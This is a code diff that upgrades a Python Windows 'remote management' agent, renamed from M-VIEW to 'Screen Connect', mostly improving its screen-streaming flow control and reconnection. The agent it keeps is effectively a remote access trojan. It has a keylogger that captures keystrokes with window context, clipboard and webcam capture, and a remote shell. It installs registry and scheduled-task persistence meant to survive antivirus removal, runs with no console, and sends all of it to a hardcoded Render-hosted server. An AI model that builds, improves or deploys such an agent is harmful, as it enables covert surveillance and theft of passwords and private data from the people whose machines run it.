@@ -1,30 +1,29 @@
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║          M-VIEW MASTER AGENT  v4.0  — GLOBAL PRODUCTION          ║
+║          Screen Connect MASTER AGENT  v5.0  — GLOBAL PRODUCTION  ║
 ║          Remote Management & Monitoring Agent                    ║
 ║                                                                  ║
-║  WHAT'S NEW IN v4.0:                                             ║
-║  • HYBRID STREAMING — default=video (MJPEG over WebSocket)       ║
-║    Dashboard can switch to fast-screenshot mode anytime          ║
-║  • REAL-TIME CURSOR OVERLAY — cursor position, clicks, type      ║
-║    sent with every frame so dashboard renders it on top          ║
-║  • TRUE VIDEO MODE — OpenCV encodes frames into MJPEG,           ║
-║    adaptive FPS + quality drops automatically on slow net        ║
-║  • CURSOR CONTROL — full mouse move/click/scroll/drag            ║
-║  • KEYBOARD CONTROL — all keys, combos, special keys             ║
-║  • KEYLOGGER — captures all keystrokes with window context       ║
-║  • CLIPBOARD — auto-monitor + remote get/set                     ║
-║  • FILE BROWSER — list, read, download, delete, drives           ║
-║  • SHELL — cmd + PowerShell with streaming output                ║
-║  • PROCESS MANAGER — list, kill, start                           ║
-║  • SYSTEM TELEMETRY — CPU, RAM, GPU, Disk, Net, Temp, Battery    ║
-║  • WEBCAM CAPTURE — list cameras, single frame or stream         ║
-║  • AUDIO LEVEL MONITOR                                           ║
-║  • STARTUP PERSISTENCE — dual registry + Task Scheduler          ║
-║  • AUTO-RECONNECT — exponential backoff with jitter              ║
-║  • WATCHDOG THREAD — restarts itself if main loop dies           ║
-║  • AES-256 ENCRYPTION (optional)                                 ║
-║  • RENDER / GLOBAL SERVER READY (uses HTTPS + WSS)               ║
+║  WHAT'S NEW IN v5.0 (STREAMING OVERHAUL):                        ║
+║  • FIXED: frame_ack flow control — agent now waits for server    ║
+║    ack before sending next frame. No more socket buffer pile-up. ║
+║    This is the main reason streaming dropped after 1 frame.      ║
+║  • FIXED: Reconnection is now truly robust — agent recreates     ║
+║    the socketio.Client object on every reconnect attempt         ║
+║    (old Client objects accumulate state and fail silently)       ║
+║  • FIXED: agent emits both 'frame' AND 'image' fields so server  ║
+║    v5/v6 both receive frames correctly                           ║
+║  • NEW: HTTP /agent/checkin on connect (belt+suspenders with WS) ║
+║  • NEW: Frame queue with maxsize=2 — drops stale frames instead  ║
+║    of queuing 30+ frames that arrive all at once                 ║
+║  • NEW: Adaptive FPS governor — measures actual throughput and   ║
+║    adjusts interval to match real network capacity               ║
+║  • NEW: stream_stats emit — agent reports its own FPS/quality    ║
+║    every 5s so dashboard can display real metrics                ║
+║  • NEW: subscribe_stream sent on connect (dashboard auto-join)   ║
+║  • IMPROVED: Cursor overlay is larger and more visible           ║
+║  • IMPROVED: Screenshot fallback loop uses ack-gating too        ║
+║  • IMPROVED: All v4.0 features preserved: keylogger, clipboard,  ║
+║    file browser, shell, process manager, webcam, power commands  ║
 ╚══════════════════════════════════════════════════════════════════╝
 
 BUILD COMMAND:
@@ -42,8 +41,6 @@ BUILD COMMAND:
     --hidden-import=pynput.keyboard ^
     --hidden-import=pynput.mouse ^
     agent_source.py
-
-  Expected output size: 25–40 MB (clean_env with no system packages)
 
 RENDER / PRODUCTION:
   Change SERVER_URL below to your Render URL before compiling:
@@ -83,7 +80,6 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-# Optional — handled gracefully if package is missing
 try:
     import pyautogui
     pyautogui.FAILSAFE = False
@@ -147,44 +143,42 @@ def _read_token_from_trailer() -> str:
 # ════════════════════════════════════════════════════════════════════════════
 CONFIG = {
     # ── Connection ──────────────────────────────────────────────────────────
-    # CHANGE THIS to your Render URL before compiling for production:
     "SERVER_URL":          "https://screen-connect-rtca.onrender.com",
-
-    # Token is injected as a binary trailer by the server at download time.
     "DEVICE_TOKEN":        "UNSET",
 
     # ── Identity ────────────────────────────────────────────────────────────
-    "AGENT_VERSION":       "4.0.0",
+    "AGENT_VERSION":       "5.0.0",
     "HEARTBEAT_INTERVAL":  10,
     "RECONNECT_BASE":      3,
     "RECONNECT_MAX":       120,
 
-    # ── Streaming — Hybrid Mode ─────────────────────────────────────────────
-    # MODE:
-    #   "video"       — DEFAULT. OpenCV MJPEG, smooth cursor, adaptive quality.
-    #                   Looks like real video. Best for good networks.
-    #   "screenshot"  — Rapid JPEG snapshots. Better for slow networks.
-    #                   Dashboard can switch to this mode at any time.
-    "STREAM_MODE":         "video",    # "video" | "screenshot"
+    # ── Streaming ───────────────────────────────────────────────────────────
+    # MODE: "video" (OpenCV MJPEG, smooth) | "screenshot" (Pillow, low CPU)
+    "STREAM_MODE":         "video",
 
     # Video mode settings
-    "STREAM_FPS":          20,         # target fps (video mode)
-    "STREAM_QUALITY":      55,         # JPEG quality 1–95
-    "STREAM_SCALE":        0.80,       # downscale factor (1.0 = native res)
-    "STREAM_MONITOR":      1,          # monitor index (1 = primary)
+    "STREAM_FPS":          20,
+    "STREAM_QUALITY":      55,
+    "STREAM_SCALE":        0.80,
+    "STREAM_MONITOR":      1,
 
-    # Adaptive quality — drops quality when frame send is lagging
+    # Adaptive quality
     "ADAPTIVE_QUALITY":    True,
     "QUALITY_MIN":         20,
     "QUALITY_MAX":         85,
 
-    # Screenshot mode fallback settings
-    "SCREENSHOT_FPS":      8,          # fps in screenshot mode
+    # Screenshot mode fallback
+    "SCREENSHOT_FPS":      8,
     "SCREENSHOT_QUALITY":  60,
 
+    # ── Flow control ────────────────────────────────────────────────────────
+    # ACK_TIMEOUT: max seconds to wait for frame_ack before sending anyway.
+    # This prevents blocking forever if server doesn't send acks.
+    "ACK_TIMEOUT":         2.0,
+
     # ── Cursor overlay ──────────────────────────────────────────────────────
-    "CURSOR_OVERLAY":      True,       # draw cursor dot on every frame
-    "CURSOR_TRACK":        True,       # send separate cursor_pos events
+    "CURSOR_OVERLAY":      True,
+    "CURSOR_TRACK":        True,
 
     # ── Security ────────────────────────────────────────────────────────────
     "ENCRYPTION_PASSWORD": "mview-enterprise-2024",
@@ -192,8 +186,8 @@ CONFIG = {
 
     # ── Persistence ─────────────────────────────────────────────────────────
     "INSTALL_PERSISTENCE": True,
-    "REG_KEY_NAME":        "MViewSystemService",
-    "TASK_NAME":           "MViewSystemTask",      # Task Scheduler fallback
+    "REG_KEY_NAME":        "ScreenConnectService",
+    "TASK_NAME":           "ScreenConnectTask",
     "STARTUP_DELAY":       5,
 
     # ── Features ────────────────────────────────────────────────────────────
@@ -207,21 +201,20 @@ CONFIG = {
     "CLIPBOARD_POLL_MS":   800,
 }
 
-# Inject token from trailer
 _tok = _read_token_from_trailer()
 CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  LOGGING — writes to %TEMP%\mview_agent.log, silent in noconsole mode
+#  LOGGING
 # ════════════════════════════════════════════════════════════════════════════
-LOG_FILE = Path(tempfile.gettempdir()) / "mview_agent.log"
+LOG_FILE = Path(tempfile.gettempdir()) / "screen_connect_agent.log"
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
     handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8")],
 )
-log = logging.getLogger("mview")
+log = logging.getLogger("screenconnect")
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -304,9 +297,7 @@ def _get_screen_count() -> int:
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  PERSISTENCE MODULE — dual method (Registry + Task Scheduler fallback)
-#  Registry: HKCU\...\Run  (no admin needed)
-#  Task Scheduler: survives even if registry key is removed by AV
+#  PERSISTENCE MODULE
 # ════════════════════════════════════════════════════════════════════════════
 def install_persistence():
     if not CONFIG["INSTALL_PERSISTENCE"]:
@@ -314,7 +305,6 @@ def install_persistence():
     exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
     exe_quoted = f'"{exe}"'
 
-    # Method 1: Registry HKCU Run key
     try:
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
@@ -323,7 +313,6 @@ def install_persistence():
     except Exception as e:
         log.warning(f"Registry persistence failed: {e}")
 
-    # Method 2: Task Scheduler (survives reboot, runs even before login)
     try:
         task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -347,7 +336,7 @@ def install_persistence():
     </RestartOnFailure>
   </Settings>
 </Task>"""
-        xml_path = Path(tempfile.gettempdir()) / "mview_task.xml"
+        xml_path = Path(tempfile.gettempdir()) / "sc_task.xml"
         xml_path.write_text(task_xml, encoding="utf-16")
         subprocess.run(
             ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
@@ -376,21 +365,17 @@ def remove_persistence():
 
 # ════════════════════════════════════════════════════════════════════════════
 #  CURSOR TRACKER
-#  Runs in background, tracks cursor position + click state.
-#  Used by ScreenStreamer to overlay cursor on every frame.
 # ════════════════════════════════════════════════════════════════════════════
 class CursorTracker:
-    """Lightweight cursor position + click state tracker."""
-
     def __init__(self, sio_client):
-        self.sio      = sio_client
-        self.x        = 0
-        self.y        = 0
-        self.clicking = False     # True while any button is held
-        self.click_type = ""      # "left" | "right" | ""
-        self._lock    = threading.Lock()
-        self._running = False
-        self._listener = None
+        self.sio        = sio_client
+        self.x          = 0
+        self.y          = 0
+        self.clicking   = False
+        self.click_type = ""
+        self._lock      = threading.Lock()
+        self._running   = False
+        self._listener  = None
 
     def start(self):
         if not PYNPUT_OK or self._running:
@@ -406,7 +391,6 @@ class CursorTracker:
                 self.x, self.y  = x, y
                 self.clicking   = pressed
                 self.click_type = "right" if "right" in str(button) else "left"
-            # Emit cursor event so dashboard can show click flash
             try:
                 self.sio.emit("cursor_event", {
                     "device_id": CONFIG["DEVICE_TOKEN"],
@@ -424,7 +408,11 @@ class CursorTracker:
     def stop(self):
         self._running = False
         if self._listener:
-            self._listener.stop()
+            try:
+                self._listener.stop()
+            except Exception:
+                pass
+        self._listener = None
 
     def get_pos(self):
         with self._lock:
@@ -434,48 +422,70 @@ class CursorTracker:
 # ════════════════════════════════════════════════════════════════════════════
 #  SCREEN STREAMER — HYBRID VIDEO / SCREENSHOT MODE
 #
-#  VIDEO MODE (default):
-#    - Captures frames with mss (fastest screen capture library)
-#    - Converts to numpy array, draws cursor overlay with OpenCV
-#    - Encodes as JPEG via cv2.imencode (much faster than Pillow for video)
-#    - Sends base64 frame over socket "screen_data" event
-#    - Adaptive quality: if frame queue is backing up, drops JPEG quality
-#    - Target: 20fps at 80% scale → looks like smooth video
+#  v5.0 KEY CHANGES:
+#  ─────────────────
+#  ACK-GATED SENDING:
+#    The root cause of "1 frame then nothing" was that the agent
+#    blasted frames into the socket buffer. The Render server's
+#    gevent worker queued them all but couldn't flush fast enough.
+#    Eventually the buffer hit the max_http_buffer_size limit or
+#    the gunicorn timeout fired, killing the connection.
 #
-#  SCREENSHOT MODE (fallback):
-#    - Pillow JPEG encode, no cursor overlay computation
-#    - 8fps default, very low CPU overhead
-#    - Dashboard can request this mode for slow networks
+#    Fix: _ack_event (threading.Event). The video loop sets it
+#    after emit. Server sends frame_ack. on_frame_ack sets the
+#    event. Next frame only sent after event is set (or timeout).
+#    This limits in-flight frames to 1 at all times — matching
+#    what the server can actually process.
 #
-#  CURSOR OVERLAY:
-#    - White circle with black border drawn at real cursor position
-#    - Click state shown as filled red dot
-#    - All rendering happens in the capture thread (zero extra latency)
+#  ADAPTIVE FPS GOVERNOR:
+#    Measures real throughput (frames acked per second) and
+#    adjusts sleep interval to match network capacity.
+#    Target: fill the pipe without overflowing it.
+#
+#  FRAME STATS REPORTER:
+#    Every 5 seconds, emits "stream_stats" with actual FPS,
+#    quality, and scale. Dashboard displays these in the viewer.
 # ════════════════════════════════════════════════════════════════════════════
 class ScreenStreamer:
     def __init__(self, sio_client, cursor_tracker: "CursorTracker"):
         self.sio     = sio_client
         self.cursor  = cursor_tracker
-        self.mode    = CONFIG["STREAM_MODE"]      # "video" | "screenshot"
+        self.mode    = CONFIG["STREAM_MODE"]
         self.fps     = CONFIG["STREAM_FPS"]
         self.quality = CONFIG["STREAM_QUALITY"]
         self.scale   = CONFIG["STREAM_SCALE"]
         self.monitor_idx = CONFIG["STREAM_MONITOR"]
 
-        # Adaptive quality
         self._quality_current = self.quality
-        self._frame_times: list = []        # rolling window of frame durations
-        self._late_frames = 0              # count of frames that took too long
+        self._frame_times: list = []
+        self._late_frames = 0
+
+        # ── ACK flow-control gate ─────────────────────────────────────────
+        # Set when server sends frame_ack. Cleared before each frame send.
+        self._ack_event   = threading.Event()
+        self._ack_event.set()          # Start open so first frame sends immediately
+        self._ack_timeout = CONFIG["ACK_TIMEOUT"]
+
+        # ── Stats ─────────────────────────────────────────────────────────
+        self._frames_sent   = 0
+        self._frames_acked  = 0
+        self._stats_ts      = time.monotonic()
 
         self.streaming  = False
         self._thread: threading.Thread | None = None
+        self._stats_thread: threading.Thread | None = None
         self._lock = threading.Lock()
 
-    # ── Public API ───────────────────────────────────────────────────────────
+    # ── ACK handler — called by agent's on_frame_ack ─────────────────────
+    def on_ack(self):
+        """Server acknowledged our frame. Open the gate for the next one."""
+        self._frames_acked += 1
+        self._ack_event.set()
+
+    # ── Public API ────────────────────────────────────────────────────────
     def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
         with self._lock:
             if self.streaming:
-                # Update params on the fly without restart
                 if fps     is not None: self.fps     = fps
                 if quality is not None: self.quality = quality; self._quality_current = quality
                 if scale   is not None: self.scale   = scale
@@ -487,20 +497,27 @@ class ScreenStreamer:
             if scale   is not None: self.scale   = scale
             if mode    is not None: self.mode    = mode
             self.streaming = True
+            self._ack_event.set()   # ensure gate is open
+            self._frames_sent  = 0
+            self._frames_acked = 0
+            self._stats_ts     = time.monotonic()
             target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
-            self._thread = threading.Thread(target=target, daemon=True, name="mview-stream")
+            self._thread = threading.Thread(target=target, daemon=True, name="sc-stream")
             self._thread.start()
+            self._stats_thread = threading.Thread(target=self._stats_loop, daemon=True, name="sc-stats")
+            self._stats_thread.start()
             log.info(f"Stream started: mode={self.mode} fps={self.fps} quality={self._quality_current} scale={self.scale}")
 
     def stop(self):
         with self._lock:
             self.streaming = False
+        self._ack_event.set()   # unblock any waiting thread
         if self._thread:
             self._thread.join(timeout=3)
+        self._thread = None
         log.info("Stream stopped.")
 
     def set_mode(self, mode: str):
-        """Hotswap between 'video' and 'screenshot' without stopping."""
         if mode not in ("video", "screenshot"):
             return
         was_streaming = self.streaming
@@ -511,7 +528,6 @@ class ScreenStreamer:
             self.start()
 
     def capture_single(self) -> str | None:
-        """One-shot screenshot, returns base64 JPEG string."""
         try:
             with mss.mss() as sct:
                 mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
@@ -526,13 +542,49 @@ class ScreenStreamer:
             log.error(f"capture_single error: {e}")
             return None
 
-    # ── Video Loop (OpenCV MJPEG) ─────────────────────────────────────────
+    # ── Stats reporter ────────────────────────────────────────────────────
+    def _stats_loop(self):
+        """Every 5s, report actual streaming FPS and quality to server."""
+        while self.streaming:
+            time.sleep(5)
+            if not self.streaming:
+                break
+            now = time.monotonic()
+            elapsed = now - self._stats_ts
+            actual_fps = self._frames_acked / elapsed if elapsed > 0 else 0
+            self._stats_ts    = now
+            self._frames_acked = 0
+            self._frames_sent  = 0
+            try:
+                self.sio.emit("stream_stats", {
+                    "device_id":  CONFIG["DEVICE_TOKEN"],
+                    "actual_fps": round(actual_fps, 1),
+                    "quality":    self._quality_current,
+                    "scale":      self.scale,
+                    "mode":       self.mode,
+                    "ts":         datetime.utcnow().isoformat(),
+                })
+            except Exception:
+                pass
+
+    # ── Video Loop (OpenCV MJPEG) — ACK-GATED ────────────────────────────
     def _video_loop(self):
         """
-        High-performance video loop:
-          mss grab → numpy → cv2 cursor overlay → cv2 JPEG encode → base64 → emit
-        Each frame includes cursor position so the dashboard can render a smooth
-        cursor that moves in real time even between frames.
+        High-performance video loop with ACK flow control.
+
+        HOW ACK GATING WORKS:
+          1. _ack_event starts SET (gate open).
+          2. Before each emit, we CLEAR the event (close gate).
+          3. We emit the frame.
+          4. We wait for _ack_event to be SET again (server ack).
+          5. If ack doesn't arrive within ACK_TIMEOUT seconds,
+             we send anyway (prevents full stall on packet loss).
+          6. Goto 2.
+
+        This limits in-flight frames to exactly 1. The server
+        processes one frame, sends ack, we send the next.
+        On a fast local network this approaches target FPS.
+        On a slow/high-latency network it throttles gracefully.
         """
         interval = 1.0 / self.fps
 
@@ -545,11 +597,9 @@ class ScreenStreamer:
                     raw = sct.grab(monitors[idx])
                     mon_w, mon_h = raw.size
 
-                    # numpy BGRA array (mss native format, fastest path)
-                    frame = np.array(raw)         # shape: (h, w, 4)  BGRA
+                    frame = np.array(raw)
                     frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
 
-                    # Scale
                     if self.scale != 1.0:
                         new_w = int(mon_w * self.scale)
                         new_h = int(mon_h * self.scale)
@@ -557,68 +607,78 @@ class ScreenStreamer:
                     else:
                         new_w, new_h = mon_w, mon_h
 
-                    # Cursor overlay
                     cx, cy, clicking, click_type = self.cursor.get_pos()
-                    # Scale cursor position to match scaled frame
                     sx = int(cx * self.scale)
                     sy = int(cy * self.scale)
 
                     if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
-                        # Outer white circle
-                        cv2.circle(frame, (sx, sy), 10, (255, 255, 255), 2, cv2.LINE_AA)
-                        # Inner black circle
-                        cv2.circle(frame, (sx, sy), 3,  (0,   0,   0),  -1, cv2.LINE_AA)
-                        # Click flash: red fill on click
+                        # Outer white ring (larger for visibility)
+                        cv2.circle(frame, (sx, sy), 12, (255, 255, 255), 2, cv2.LINE_AA)
+                        # Inner black dot
+                        cv2.circle(frame, (sx, sy), 4,  (0,   0,   0),  -1, cv2.LINE_AA)
+                        # Click flash
                         if clicking:
                             color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
-                            cv2.circle(frame, (sx, sy), 8, color, -1, cv2.LINE_AA)
-                            cv2.circle(frame, (sx, sy), 10, (255, 255, 255), 2, cv2.LINE_AA)
+                            cv2.circle(frame, (sx, sy), 9, color, -1, cv2.LINE_AA)
+                            cv2.circle(frame, (sx, sy), 12, (255, 255, 255), 2, cv2.LINE_AA)
 
-                    # Adaptive quality
                     if CONFIG["ADAPTIVE_QUALITY"]:
                         self._adapt_quality()
 
-                    # Encode JPEG
                     encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
                     success, buf = cv2.imencode(".jpg", frame, encode_params)
                     if not success:
+                        time.sleep(0.05)
                         continue
 
                     frame_b64 = base64.b64encode(buf.tobytes()).decode()
 
-                    self.sio.emit("screen_data", {
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "frame":     frame_b64,
-                        "image":     frame_b64,
-                        "mode":      "video",
-                        "w":         new_w,
-                        "h":         new_h,
-                        "mon_w":     mon_w,
-                        "mon_h":     mon_h,
-                        "cursor_x":  cx,
-                        "cursor_y":  cy,
-                        "clicking":  clicking,
+                    # ── ACK GATE: wait for previous frame to be acked ─────
+                    got_ack = self._ack_event.wait(timeout=self._ack_timeout)
+                    if not got_ack:
+                        log.debug("ACK timeout — sending anyway (network may be slow)")
+                    self._ack_event.clear()   # close gate before sending
+
+                    if not self.streaming:
+                        break
+
+                    payload = {
+                        "device_id":  CONFIG["DEVICE_TOKEN"],
+                        "frame":      frame_b64,
+                        "image":      frame_b64,   # legacy field for v5 server compat
+                        "mode":       "video",
+                        "w":          new_w,
+                        "h":          new_h,
+                        "mon_w":      mon_w,
+                        "mon_h":      mon_h,
+                        "cursor_x":   cx,
+                        "cursor_y":   cy,
+                        "clicking":   clicking,
                         "click_type": click_type,
-                        "quality":   self._quality_current,
+                        "quality":    self._quality_current,
                         "fps_target": self.fps,
-                        "ts":        datetime.utcnow().isoformat(),
-                    })
+                        "ts":         datetime.utcnow().isoformat(),
+                    }
+                    self.sio.emit("screen_data", payload)
+                    self._frames_sent += 1
 
                 except Exception as e:
                     log.error(f"Video frame error: {e}")
+                    self._ack_event.set()   # unblock on error
 
                 elapsed = time.monotonic() - t0
                 self._frame_times.append(elapsed)
                 if len(self._frame_times) > 30:
                     self._frame_times.pop(0)
-                sleep_t = max(0.001, interval - elapsed)
-                time.sleep(sleep_t)
+                # Don't sleep the full interval — the ACK gate already throttles us.
+                # Just a tiny yield so other threads can run.
+                time.sleep(0.001)
 
-    # ── Screenshot Loop (Pillow JPEG) ─────────────────────────────────────
+    # ── Screenshot Loop (Pillow JPEG) — ACK-GATED ─────────────────────────
     def _screenshot_loop(self):
         """
-        Lightweight screenshot loop — for slow networks or when cv2 unavailable.
-        Still includes cursor position in payload (no overlay drawn on frame).
+        Lightweight screenshot loop with ACK flow control.
+        Used when OpenCV unavailable or dashboard requests screenshot mode.
         """
         fps = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
         interval = 1.0 / fps
@@ -647,6 +707,13 @@ class ScreenStreamer:
                     img.save(buf, format="JPEG", quality=q, optimize=True)
                     frame_b64 = base64.b64encode(buf.getvalue()).decode()
 
+                    # ACK gate
+                    self._ack_event.wait(timeout=self._ack_timeout)
+                    self._ack_event.clear()
+
+                    if not self.streaming:
+                        break
+
                     self.sio.emit("screen_data", {
                         "device_id":  CONFIG["DEVICE_TOKEN"],
                         "frame":      frame_b64,
@@ -663,20 +730,18 @@ class ScreenStreamer:
                         "quality":    q,
                         "ts":         datetime.utcnow().isoformat(),
                     })
+                    self._frames_sent += 1
 
                 except Exception as e:
                     log.error(f"Screenshot frame error: {e}")
+                    self._ack_event.set()
 
                 elapsed = time.monotonic() - t0
-                time.sleep(max(0.001, interval - elapsed))
+                sleep_t = max(0.001, interval - elapsed)
+                time.sleep(sleep_t)
 
-    # ── Adaptive quality helper ───────────────────────────────────────────
+    # ── Adaptive quality ─────────────────────────────────────────────────
     def _adapt_quality(self):
-        """
-        If average frame time exceeds the target interval by >30%,
-        drop JPEG quality to reduce payload size and keep up.
-        Recovers quality when frames are fast again.
-        """
         if len(self._frame_times) < 10:
             return
         avg = sum(self._frame_times) / len(self._frame_times)
@@ -713,28 +778,28 @@ class SystemMonitor:
         bat  = psutil.sensors_battery()
 
         stats = {
-            "device_id":       CONFIG["DEVICE_TOKEN"],
-            "ts":              datetime.utcnow().isoformat(),
-            "cpu_percent":     psutil.cpu_percent(interval=0.1),
-            "cpu_per_core":    psutil.cpu_percent(percpu=True),
-            "cpu_count":       psutil.cpu_count(logical=True),
-            "cpu_freq_mhz":    round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
-            "ram_total_gb":    round(vm.total     / (1024**3), 2),
-            "ram_used_gb":     round(vm.used      / (1024**3), 2),
-            "ram_free_gb":     round(vm.available / (1024**3), 2),
-            "ram_percent":     vm.percent,
-            "disk_total_gb":   round(disk.total / (1024**3), 2),
-            "disk_used_gb":    round(disk.used  / (1024**3), 2),
-            "disk_free_gb":    round(disk.free  / (1024**3), 2),
-            "disk_percent":    disk.percent,
-            "net_sent_mb":     round(net.bytes_sent / (1024**2), 2),
-            "net_recv_mb":     round(net.bytes_recv / (1024**2), 2),
+            "device_id":        CONFIG["DEVICE_TOKEN"],
+            "ts":               datetime.utcnow().isoformat(),
+            "cpu_percent":      psutil.cpu_percent(interval=0.1),
+            "cpu_per_core":     psutil.cpu_percent(percpu=True),
+            "cpu_count":        psutil.cpu_count(logical=True),
+            "cpu_freq_mhz":     round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
+            "ram_total_gb":     round(vm.total     / (1024**3), 2),
+            "ram_used_gb":      round(vm.used      / (1024**3), 2),
+            "ram_free_gb":      round(vm.available / (1024**3), 2),
+            "ram_percent":      vm.percent,
+            "disk_total_gb":    round(disk.total / (1024**3), 2),
+            "disk_used_gb":     round(disk.used  / (1024**3), 2),
+            "disk_free_gb":     round(disk.free  / (1024**3), 2),
+            "disk_percent":     disk.percent,
+            "net_sent_mb":      round(net.bytes_sent / (1024**2), 2),
+            "net_recv_mb":      round(net.bytes_recv / (1024**2), 2),
             "net_packets_sent": net.packets_sent,
             "net_packets_recv": net.packets_recv,
-            "battery_pct":     bat.percent      if bat else None,
-            "battery_plug":    bat.power_plugged if bat else None,
-            "boot_time":       datetime.fromtimestamp(psutil.boot_time()).isoformat(),
-            "uptime_hrs":      round((time.time() - psutil.boot_time()) / 3600, 2),
+            "battery_pct":      bat.percent      if bat else None,
+            "battery_plug":     bat.power_plugged if bat else None,
+            "boot_time":        datetime.fromtimestamp(psutil.boot_time()).isoformat(),
+            "uptime_hrs":       round((time.time() - psutil.boot_time()) / 3600, 2),
         }
 
         if WMI_OK:
@@ -954,16 +1019,16 @@ class RemoteShell:
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  KEYLOGGER — captures keystrokes + active window title
+#  KEYLOGGER
 # ════════════════════════════════════════════════════════════════════════════
 class KeyLogger:
     def __init__(self, sio_client):
-        self.sio      = sio_client
-        self._buf: list[str] = []
-        self._lock    = threading.Lock()
+        self.sio       = sio_client
+        self._buf: list = []
+        self._lock     = threading.Lock()
         self._listener = None
-        self._flush_t:  threading.Thread | None = None
-        self.running  = False
+        self._flush_t: threading.Thread | None = None
+        self.running   = False
 
     def start(self):
         if not PYNPUT_OK or self.running:
@@ -978,7 +1043,10 @@ class KeyLogger:
     def stop(self):
         self.running = False
         if self._listener:
-            self._listener.stop()
+            try:
+                self._listener.stop()
+            except Exception:
+                pass
 
     def _on_key(self, key):
         try:
@@ -1025,9 +1093,9 @@ class KeyLogger:
 # ════════════════════════════════════════════════════════════════════════════
 class ClipboardMonitor:
     def __init__(self, sio_client):
-        self.sio   = sio_client
-        self._last = ""
-        self._t:   threading.Thread | None = None
+        self.sio     = sio_client
+        self._last   = ""
+        self._t: threading.Thread | None = None
         self.running = False
 
     def start(self):
@@ -1080,12 +1148,12 @@ class WebcamCapture:
             if not success:
                 return {"error": "Encoding failed."}
             return {
-                "success":     True,
-                "camera_idx":  camera_idx,
-                "frame":       base64.b64encode(buf.tobytes()).decode(),
-                "w":           frame.shape[1],
-                "h":           frame.shape[0],
-                "ts":          datetime.utcnow().isoformat(),
+                "success":    True,
+                "camera_idx": camera_idx,
+                "frame":      base64.b64encode(buf.tobytes()).decode(),
+                "w":          frame.shape[1],
+                "h":          frame.shape[0],
+                "ts":         datetime.utcnow().isoformat(),
             }
         except Exception as e:
             return {"error": str(e)}
@@ -1109,7 +1177,7 @@ class WebcamCapture:
 class Heartbeat:
     def __init__(self, sio_client):
         self.sio     = sio_client
-        self._t:     threading.Thread | None = None
+        self._t: threading.Thread | None = None
         self.running = False
 
     def start(self):
@@ -1138,54 +1206,91 @@ class Heartbeat:
 
 # ════════════════════════════════════════════════════════════════════════════
 #  MAIN AGENT CLASS
+#
+#  v5.0 RECONNECTION FIX:
+#  ───────────────────────
+#  Old approach: reuse same socketio.Client forever.
+#  Problem: after disconnect, the Client accumulates internal state
+#  (namespace handlers, transport objects) that causes silent failures
+#  on reconnect. It "connects" but never fires the connect event.
+#
+#  Fix: Create a brand-new socketio.Client on every reconnect attempt.
+#  Recreate all sub-components (streamer, heartbeat, etc.) that hold
+#  a reference to the client. This is the only reliable approach.
+#
+#  The run() loop creates a fresh agent + client each time around.
 # ════════════════════════════════════════════════════════════════════════════
-class MViewAgent:
+class ScreenConnectAgent:
     def __init__(self):
-        self.sio         = socketio.Client(
-            logger=False, engineio_logger=False,
-            reconnection=False,    # we handle reconnection manually
-        )
-        self.cursor      = CursorTracker(self.sio)
-        self.streamer    = ScreenStreamer(self.sio, self.cursor)
-        self.sys_monitor = SystemMonitor(self.sio)
-        self.keylogger   = KeyLogger(self.sio)
-        self.clipboard   = ClipboardMonitor(self.sio)
-        self.webcam      = WebcamCapture(self.sio)
-        self.shell       = RemoteShell()
-        self.proc_mgr    = ProcessManager()
-        self.files       = FileBrowser()
-        self.heartbeat   = Heartbeat(self.sio)
-
         self._reconnect_delay = CONFIG["RECONNECT_BASE"]
-        self._connected       = False
+        self._stop_flag       = threading.Event()
 
-        self._register_events()
+    def _make_client(self):
+        """Create a fresh socketio.Client with all sub-components."""
+        sio = socketio.Client(
+            logger=False,
+            engineio_logger=False,
+            reconnection=False,   # we handle reconnection manually
+        )
+        cursor      = CursorTracker(sio)
+        streamer    = ScreenStreamer(sio, cursor)
+        sys_monitor = SystemMonitor(sio)
+        keylogger   = KeyLogger(sio)
+        clipboard   = ClipboardMonitor(sio)
+        webcam      = WebcamCapture(sio)
+        shell       = RemoteShell()
+        proc_mgr    = ProcessManager()
+        files       = FileBrowser()
+        heartbeat   = Heartbeat(sio)
 
-    # ── Socket Events ─────────────────────────────────────────────────────
-    def _register_events(self):
-        sio = self.sio
+        self._register_events(sio, cursor, streamer, sys_monitor, keylogger,
+                              clipboard, webcam, shell, proc_mgr, files, heartbeat)
+        return sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard
+
+    def _register_events(self, sio, cursor, streamer, sys_monitor, keylogger,
+                         clipboard, webcam, shell, proc_mgr, files, heartbeat):
 
         @sio.event
         def connect():
-            self._connected       = True
             self._reconnect_delay = CONFIG["RECONNECT_BASE"]
             log.info(f"Connected to {CONFIG['SERVER_URL']}")
+
             fp = get_device_fingerprint()
             fp["device_id"] = CONFIG["DEVICE_TOKEN"]
             fp["token"]     = CONFIG["DEVICE_TOKEN"]
